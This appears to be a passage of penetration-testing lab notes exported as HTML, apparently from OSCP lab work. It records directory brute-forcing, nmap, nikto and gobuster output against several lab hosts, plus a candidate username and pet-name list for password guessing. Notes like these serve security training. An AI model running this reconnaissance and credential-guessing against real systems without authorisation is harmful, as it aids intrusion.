/>000000258:   503        0 L      4 W      67 Ch       &quot;welcome&quot;                                                                                                                            <br />000000259:   200        151 L    380 W    6893 Ch     &quot;admin&quot;                                                                                                                              <br />000000269:   500        0 L      19 W     719 Ch      &quot;static&quot;                                                                                                                             <br />000000386:   303        0 L      6 W      53 Ch       &quot;issues&quot;                                                                                                                             <br />000000475:   400        0 L      2 W      50 Ch       &quot;wp-login&quot;                                                                                                                           <br />000000640:   400        0 L      2 W      50 Ch       &quot;used-cars&quot;                                                                                                                          <br />000000702:   400        0 L      2 W      50 Ch       &quot;privacy-policy&quot;                                                                                                                     <br />000000708:   400        0 L      2 W      50 Ch       &quot;contact-us&quot;                                                                                                                         <br />000000786:   400        0 L      2 W      50 Ch       &quot;wp-includes&quot;                                                                                                                        <br />000000813:   400        0 L      2 W      50 Ch       &quot;site-map&quot;                                                                                                                           <br />000000972:   400        0 L      2 W      50 Ch       &quot;german-cars&quot;                                                                                                                        <br />000000973:   400        0 L      2 W      50 Ch       &quot;japan-cars&quot;                                                                                                                         <br />000000974:   400        0 L      2 W      50 Ch       &quot;moto-news&quot;                                                                                                                          <br />000000978:   400        0 L      2 W      50 Ch       &quot;wp-register&quot;                                                                                                                        <br />000000979:   400        0 L      2 W      50 Ch       &quot;american-cars&quot;                                                                                                                      <br />000000984:   400        0 L      2 W      50 Ch       &quot;ferrari-dino&quot;                                                                                                                       <br />000000985:   400        0 L      2 W      50 Ch       &quot;italian-cars&quot;                                                                                                                       <br />000000986:   400        0 L      2 W      50 Ch       &quot;french-cars&quot;                                                                                                                        <br />000001076:   400        0 L      2 W      50 Ch       &quot;ubuntu-6&quot;                                                                                                                           <br />000001095:   400        0 L      2 W      50 Ch       &quot;-&quot;                                                                                                                                  <br />000001119:   400        0 L      2 W      50 Ch       &quot;about-us&quot;                                                                                                                           <br />000001161:   400        0 L      2 W      50 Ch       &quot;valid-xhtml10&quot;                                                                                                                      <br />000001281:   400        0 L      2 W      50 Ch       &quot;wp-rss2&quot;                                                                                                                            <br />000001425:   500        0 L      19 W     865 Ch      &quot;issue&quot;                                                                                                                              <br />000001466:   400        0 L      2 W      50 Ch       &quot;468x60-1&quot;                                                                                                                           <br />000001679:   400        0 L      2 W      50 Ch       &quot;valid-html401&quot;                                                                                                                      <br />000001759:   400        0 L      2 W      50 Ch       &quot;press-releases&quot;                                                                                                                     <br />000001879:   400        0 L      2 W      50 Ch       &quot;125x125-1&quot;                                                                                                                          <br />000001951:   400        0 L      2 W      50 Ch       &quot;en-US&quot;                                                                                                                              <br />000001974:   400        0 L      2 W      50 Ch       &quot;anti-spam&quot;                                                                                                                          <br />000001977:   400        0 L      2 W      50 Ch       &quot;new-cars&quot;                                                                                                                           <br />000002024:   400        0 L      2 W      50 Ch       &quot;&#39;&quot;                                                                                                                                  <br />000002130:   400        0 L      2 W      50 Ch       &quot;french-car&quot;                                                                                                                         <br />000002133:   400        0 L      2 W      50 Ch       &quot;japan-car&quot;                                                                                                                          <br />000002135:   400        0 L      2 W      50 Ch       &quot;german-car&quot;                                                                                                                         <br />000002136:   400        0 L      2 W      50 Ch       &quot;italian-car&quot;                                                                                                                        <br />000002137:   400        0 L      2 W      50 Ch       &quot;us-car&quot;                                                                                                                             <br />000002140:   400        0 L      2 W      50 Ch       &quot;honda-fcx&quot;                                                                                                                          <br />000002193:   400        0 L      2 W      50 Ch       &quot;open-source&quot;                                                                                                                        <br />000002299:   400        0 L      2 W      50 Ch       &quot;en-us&quot;                                                                                                                              <br />000002342:   400        0 L      2 W      50 Ch       &quot;336x280-2&quot;                                                                                                                          <br />000002383:   400        0 L      2 W      50 Ch       &quot;2006-12&quot;                                                                                                                            <br />000002527:   400        0 L      2 W      50 Ch       &quot;mature-sex&quot;                                                                                                                         <br />000002531:   400        0 L      2 W      50 Ch       &quot;web-hosting&quot;                                                                                                                        <br />000002939:   400        0 L      2 W      50 Ch       &quot;nph-traceroute&quot;                                                                                                                     <br />000003003:   400        0 L      2 W      50 Ch       &quot;valid-rss&quot;                                                                                                                          <br />000003027:   200        178 L    749 W    11521 Ch    &quot;teams&quot;                                                                                                                              <br />000003033:   400        0 L      2 W      50 Ch       &quot;RSA-336x280&quot;                                                                                                                        <br />000003088:   400        0 L      2 W      50 Ch       &quot;mailing-lists&quot;                                                                                                                      <br />000003180:   400        0 L      2 W      50 Ch       &quot;2006-11&quot;                                                                                                                            <br />000003196:   400        0 L      2 W      50 Ch       &quot;e-commerce&quot; </div><div class='page'><h1 class='title level-5'>pictures</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.50 Bethany</h1><br/><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Microsoft-IIS/8.5<br /><a href="https://en.wikipedia.org/wiki/Windows_Server_2012_R2">Windows Server 2012 R2</a> and <a href="https://en.wikipedia.org/wiki/Windows_8.1">Windows 8.1</a>.<br />x64<br /><br /><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/><br />echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.50 &amp;&amp; nmap -sC -sV -Pn 10.11.1.50 &amp;&amp; nmap -p- -Pn 10.11.1.50<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 16:52 EDT<br />Nmap scan report for 10.11.1.50<br />Host is up (0.072s latency).<br />Not shown: 998 filtered ports<br />PORT    STATE SERVICE<br />80/tcp  open  http<br />135/tcp open  msrpc<br /><br />Nmap done: 1 IP address (1 host up) scanned in 11.17 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 16:52 EDT<br />Nmap scan report for 10.11.1.50<br />Host is up (0.079s latency).<br />Not shown: 998 filtered ports<br />PORT    STATE SERVICE VERSION<br />80/tcp  open  http    Microsoft IIS httpd 8.5<br />|_http-generator: Drupal 7 (http://drupal.org)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Microsoft-IIS/8.5<br />|_http-title: Welcome to Bethany&amp;#039;s Page | Bethany&amp;#039;s Page<br />135/tcp open  msrpc   Microsoft Windows RPC<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 16:53 EDT<br />Nmap scan report for 10.11.1.50<br />Host is up (0.068s latency).<br />Not shown: 65532 filtered ports<br />PORT     STATE SERVICE<br />80/tcp   open  http<br />135/tcp  open  msrpc<br />9505/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 144.41 seconds</div><div class='page'><h1 class='title level-6'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.50<br />+ Target Hostname:    10.11.1.50<br />+ Target Port:        80<br />+ Start Time:         2020-04-30 17:24:32 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/8.5<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Entry &#39;/INSTALL.mysql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.pgsql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.sqlite.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/LICENSE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/MAINTAINERS.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/UPGRADE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=admin/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=comment/reply/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=filter/tips/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=node/add/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=search/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/register/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/logout/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 36 entries which should be manually viewed.<br />+ OSVDB-39272: /misc/favicon.ico file identifies this app/server as: Drupal 7.x<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ OSVDB-3092: /README.TXT: This might be interesting...<br />+ OSVDB-3092: /readme.txt: This might be interesting...<br />+ OSVDB-3092: /UPGRADE.txt: Default file found.<br />+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.<br />+ OSVDB-3233: /INSTALL.mysql.txt: Drupal installation file found.<br />+ OSVDB-3233: /INSTALL.pgsql.txt: Drupal installation file found.<br />+ OSVDB-3092: /license.txt: License file found may identify site software.<br />+ OSVDB-3092: /LICENSE.TXT: License file found may identify site software.<br />+ 8762 requests: 0 error(s) and 30 item(s) reported on remote host<br />+ End Time:           2020-04-30 17:35:28 (GMT-4) (656 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>userlist</h1><br/>alice<br />bethany<br />ann<br />lee<br />ian<br />nick<br />pedro<br /><br />Max<br />Bella<br />Bailey<br />Lucy<br />Charlie<br />Molly<br />Buddy<br />Daisy<br />Rocky<br />Maggie<br />Jake    **I Like this one a lot**<br />Sophie<br />Jack<br />Sadie<br />Toby<br />Chloe<br />Cody<br />Bailey<br />Buster<br />Lola<br />Duke<br />Zoe<br />Cooper<br />Abby<br />Riley<br />Ginger<br />Harley<br />Roxy<br />Bear<br />Gracie<br />Tucker<br />Coco<br />Murphy<br />Sasha<br />Lucky<br />Lily<br />Oliver<br />Angel<br />Sam<br />Princess<br />Oscar<br />Emma<br />Teddy   **Nick&#39;s Fav**<br />Annie<br />Winston<br />Rosie<br />Sammy<br />Ruby<br />Rusty<br />Lady<br /><br />1  Kyoto, Japan<br />2  Charleston, South Carolina<br />3  Florence<br />4  Siem Reap, Cambodia<br />5  Rome<br />6  Istanbul<br />7  Seville, Spain<br />8  Barcelona<br />9  Mexico City<br />10  New Orleans</div><div class='page'><h1 class='title level-5'>pictures</h1><br/><br /><a href=""><img src="images/965-1.png" alt="images/965-1.png" /></a></div><div class='page'><h1 class='title level-4'>10.11.1.71 Alpha</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.71 &amp;&amp; nmap -sC -sV -Pn 10.11.1.71 &amp;&amp; nmap -p- -Pn 10.11.1.71<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-01 09:51 EDT<br />Nmap scan report for 10.11.1.71<br />Host is up (0.083s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-01 09:51 EDT<br />Nmap scan report for 10.11.1.71<br />Host is up (0.073s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   256 e6:43:89:59:f9:85:d8:e2:bb:e3:d7:ed:28:5c:c5:65 (ECDSA)<br />|_  256 3b:0b:f3:84:3c:7d:6e:2b:2c:81:11:94:16:9b:71:7d (ED25519)<br />80/tcp open  http    Apache/2.4.7 (Ubuntu)<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 109.82 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-01 09:52 EDT<br />Nmap scan report for 10.11.1.71<br />Host is up (0.065s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 75.06 seconds<br /></div><div class='page'><h1 class='title level-6'>gobust</h1><br/>squid@CoolHandKali:/Yeet/Machines/OSCP/71$ gobuster dir -u <a href="http://10.11.1.71/">http://10.11.1.71/</a> -w /usr/share/seclists/Discovery/Web-Content/common.txt <br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            <a href="http://10.11.1.71/">http://10.11.1.71/</a><br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Timeout:        10s<br />===============================================================<br />2020/05/01 10:54:46 Starting gobuster<br />===============================================================<br />/.hta (Status: 403)<br />/.htaccess (Status: 403)<br />/.htpasswd (Status: 403)<br />/cache (Status: 301)<br />/cgi-bin/ (Status: 403)<br />/core (Status: 301)<br />/custom (Status: 301)<br />/index.php (Status: 302)<br />/javascript (Status: 301)<br />/phpmyadmin (Status: 301)<br />/server-status (Status: 403)<br />/site (Status: 301)<br />/templates (Status: 301)<br />===============================================================<br />2020/05/01 10:55:19 Finished<br />===============================================================<br /><br /><br /><br /><br />echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.71 &amp;&amp; nmap -sC -sV -Pn 10.11.1.71 &amp;&amp; nmap -p- -Pn 10.11.1.71<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-01 09:51 EDT<br />Nmap scan report for 10.11.1.71<br />Host is up (0.083s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-01 09:51 EDT<br />Nmap scan report for 10.11.1.71<br />Host is up (0.073s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   256 e6:43:89:59:f9:85:d8:e2:bb:e3:d7:ed:28:5c:c5:65 (ECDSA)<br />|_  256 3b:0b:f3:84:3c:7d:6e:2b:2c:81:11:94:16:9b:71:7d (ED25519)<br />80/tcp open  http    Apache/2.4.7 (Ubuntu)<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 109.82 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-01 09:52 EDT<br />Nmap scan report for 10.11.1.71<br />Host is up (0.065s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 75.06 seconds<br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.72 Beta</h1><br/></div><div class='page'><h1 class='title level-5'>enuemration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/></div><div class='page'><h1 class='title level-5'>pictures</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.79 Maria</h1><br/>Nmap scan report for 10.11.1.222<br />Host is up (0.085s latency).<br /><br />PORT     STATE SERVICE<br />2233/tcp open  infocrypt<br /><br />Chris is rooted, but I could not find the file... (Chris=222)</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Nmap scan report for 10.11.1.222<br />Host is up (0.085s latency).<br /><br />2233/tcp open  infocrypt<br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.111 1nsider</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Windows 10.0 Build 17763 x64 (name:1NSIDER) (domain:1NSIDER)<br /><br />Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.111 &amp;&amp; nmap -sC -sV -Pn 10.11.1.111 &amp;&amp; nmap -p- -Pn 10.11.1.111<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 18:21 EDT<br />Nmap scan report for 10.11.1.111<br />Host is up (0.075s latency).<br />Not shown: 995 closed ports<br />PORT     STATE SERVICE<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />1433/tcp open  ms-sql-s<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 18:21 EDT<br />Nmap scan report for 10.11.1.111<br />Host is up (0.074s latency).<br />Not shown: 995 closed ports<br />PORT     STATE SERVICE       VERSION<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />445/tcp  open  microsoft-ds?<br />1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM<br />| ms-sql-ntlm-info: <br />|   Target_Name: 1NSIDER<br />|   NetBIOS_Domain_Name: 1NSIDER<br />|   NetBIOS_Computer_Name: 1NSIDER<br />|   DNS_Domain_Name: 1nsider<br />|   DNS_Computer_Name: 1nsider<br />|_  Product_Version: 10.0.17763<br />| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br />| Not valid before: 2020-03-31T18:28:20<br />|_Not valid after:  2050-03-31T18:28:20<br />|_ssl-date: 2020-05-07T22:19:57+00:00; -1m35s from scanner time.<br />3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: 1NSIDER<br />|   NetBIOS_Domain_Name: 1NSIDER<br />|   NetBIOS_Computer_Name: 1NSIDER<br />|   DNS_Domain_Name: 1nsider<br />|   DNS_Computer_Name: 1nsider<br />|   Product_Version: 10.0.17763<br />|_  System_Time: 2020-05-07T22:19:49+00:00<br />| ssl-cert: Subject: commonName=1nsider<br />| Not valid before: 2020-01-20T20:44:36<br />|_Not valid after:  2020-07-21T20:44:36<br />|_ssl-date: 2020-05-07T22:19:57+00:00; -1m35s from scanner time.<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -1m35s, deviation: 0s, median: -1m35s<br />| ms-sql-info: <br />|   10.11.1.111:1433: <br />|     Version: <br />|       name: Microsoft SQL Server 2017 RTM<br />|       number: 14.00.1000.00<br />|       Product: Microsoft SQL Server 2017<br />|       Service pack level: RTM<br />|       Post-SP patches applied: false<br />|_    TCP port: 1433<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-07T22:19:52<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 22.13 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 18:21 EDT<br />Nmap scan report for 10.11.1.111<br />Host is up (0.065s latency).<br />Not shown: 65519 closed ports<br />PORT      STATE SERVICE<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br />5985/tcp  open  wsman<br />8732/tcp  open  dtp-net<br />47001/tcp open  winrm<br />49664/tcp open  unknown<br />49665/tcp open  unknown<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br />49668/tcp open  unknown<br />49669/tcp open  unknown<br />49670/tcp open  unknown<br />49671/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 101.84 seconds<br />root@CoolHandKali:/Yeet/Machines/OSCP/111# nmap -sC -sV -Pn 10.11.1.111 -p 8732<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 18:23 EDT<br />Nmap scan report for 10.11.1.111<br />Host is up (0.086s latency).<br /><br />PORT     STATE SERVICE VERSION<br />8732/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds<br /><br />root@CoolHandKali:/Yeet/Machines/OSCP/111# nmap 10.11.1.111 -sU<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 18:39 EDT<br />Nmap scan report for 1nsider (10.11.1.111)<br />Host is up (0.083s latency).<br />Not shown: 991 closed ports<br />PORT     STATE         SERVICE<br />69/udp   open|filtered tftp<br />123/udp  open|filtered ntp<br />137/udp  open|filtered netbios-ns<br />138/udp  open|filtered netbios-dgm<br />500/udp  open|filtered isakmp<br />3389/udp open|filtered ms-wbt-server<br />4500/udp open|filtered nat-t-ike<br />5353/udp open|filtered zeroconf<br />5355/udp open|filtered llmnr<br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.118 Peter</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1m1e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.118 &amp;&amp; nmap -sC -sV -Pn 10.11.1.118 &amp;&amp; nmap -p- -Pn 10.11.1.118 &amp;&amp; nmap -Pn -p- -sU 10.11.1.118<br />1<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:07 EDT<br />Nmap scan report for 10.11.1.118<br />Host is up (0.063s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:07 EDT<br />Nmap scan report for 10.11.1.118<br />Host is up (0.067s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE       VERSION<br />3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: PETER<br />|   NetBIOS_Domain_Name: PETER<br />|   NetBIOS_Computer_Name: PETER<br />|   DNS_Domain_Name: peter<br />|   DNS_Computer_Name: peter<br />|   Product_Version: 10.0.17763<br />|_  System_Time: 2020-05-09T15:05:21+00:00<br />| ssl-cert: Subject: commonName=peter<br />| Not valid before: 2020-03-30T17:38:36<br />|_Not valid after:  2020-09-29T17:38:36<br />|_ssl-date: 2020-05-09T15:05:22+00:00; -2m00s from scanner time.<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m00s, deviation: 0s, median: -2m01s<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:07 EDT<br />Nmap scan report for 10.11.1.118<br />Host is up (0.062s latency).<br />Not shown: 65534 filtered ports<br />PORT     STATE SERVICE<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 125.04 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.133</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>XP (IIS 5.1)</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 16:31 EDT<br />Nmap scan report for 10.11.1.133<br />Host is up (0.15s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 59.93 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 16:32 EDT<br />Nmap scan report for 10.11.1.133<br />Host is up (0.080s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS 5.6<br />| fingerprint-strings: <br />|   GetRequest, HTTPOptions: <br />|     HTTP/1.1 200 OK<br />|     Date: Mon, 11 May 2020 20:31:03 GMT<br />|     Server: Microsoft IIS 5.6<br />|     Vary: Accept-Encoding<br />|     Content-Length: 619<br />|     Connection: close<br />|     Content-Type: text/html; charset=UTF-8<br />|     &lt;html&gt;<br />|     &lt;head&gt;<br />|     &lt;title&gt;Let&#39;s play with the offsec team&lt;/title&gt;<br />|     &lt;/head&gt;<br />|     &lt;body style=&quot;color: #FFFFFF; background-color: #000000;font-family: verdana;&quot;&gt;<br />|     &lt;center&gt;<br />|     &lt;div style=&quot;width:600px;height:399px;background-image:url(offsec-team.jpg);&quot;&gt;<br />|     &lt;form method=&quot;post&quot; action=&quot;login.asp&quot;&gt;<br />|     &lt;table style=&quot;padding-top:170px;&quot;&gt;<br />|     &lt;tr&gt;<br />|     &lt;td&gt;Username: &lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot;&gt;&lt;/td&gt;<br />|     &lt;/tr&gt;<br />|     &lt;tr&gt;<br />|     &lt;td&gt;Password: &lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;<br />|     &lt;/tr&gt;<br />|     &lt;tr&gt;<br />|     colspan=&quot;2&quot; align=&quot;right&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Enter&quot;&gt;&lt;/td&gt;<br />|     &lt;/tr&gt;<br />|     &lt;/table&gt;<br />|     &lt;/form&gt;<br />|     &lt;/div&gt;<br />|     &lt;/center&gt;<br />|     &lt;/body&gt;<br />|_    &lt;/html&gt;<br />|_http-server-header: Microsoft IIS 5.6<br />|_http-title: Let&#39;s play with the offsec team<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br />SF-Port80-TCP:V=7.80%I=7%D=5/11%Time=5EB9B686%P=x86_64-pc-linux-gnu%r(GetR<br />SF:equest,325,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2011\x20May\x20202<br />SF:0\x2020:31:03\x20GMT\r\nServer:\x20Microsoft\x20IIS\x205\.6\r\nVary:\x2<br />SF:0Accept-Encoding\r\nContent-Length:\x20619\r\nConnection:\x20close\r\nC<br />SF:ontent-Type:\x20text/html;\x20charset=UTF-8\r\n\r\n&lt;html&gt;\n&lt;head&gt;\n&lt;tit<br />SF:le&gt;Let&#39;s\x20play\x20with\x20the\x20offsec\x20team&lt;/title&gt;\n&lt;/head&gt;\n&lt;bo<br />SF:dy\x20style=\&quot;color:\x20#FFFFFF;\x20background-color:\x20#000000;font-f<br />SF:amily:\x20verdana;\&quot;&gt;\n&lt;center&gt;\n&lt;div\x20style=\&quot;width:600px;height:399<br 